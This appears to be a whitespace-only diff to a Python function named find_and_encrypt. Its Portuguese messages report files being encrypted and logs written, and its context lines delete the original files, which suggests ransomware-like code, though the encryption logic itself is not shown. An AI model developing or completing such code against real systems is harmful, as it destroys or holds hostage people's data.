@@ -119,7 +119,6 @@ def find_and_encrypt(
                                     )
                                 )
                             ):
-                                
                                 print(f'\33[31mArquivo {os.path.join(root, file)} Encriptado.\33[0m')
 
                         os.remove(
@@ -152,8 +151,7 @@ def find_and_encrypt(
                                             data
                                         )
                                     )
-                                ):
-                                    
+                                ):      
                                     print(f'\33[31mArquivo {os.path.join(root, file)} Encriptado.\33[0m')
 
                             os.remove(
@@ -183,8 +181,7 @@ def find_and_encrypt(
                                         lf.write(
                                             logs
                                         )
-                                    ):
-                                        
+                                    ):      
                                         print(f'\33[32mLogs gerado em {lf}\33[0m')
 
 
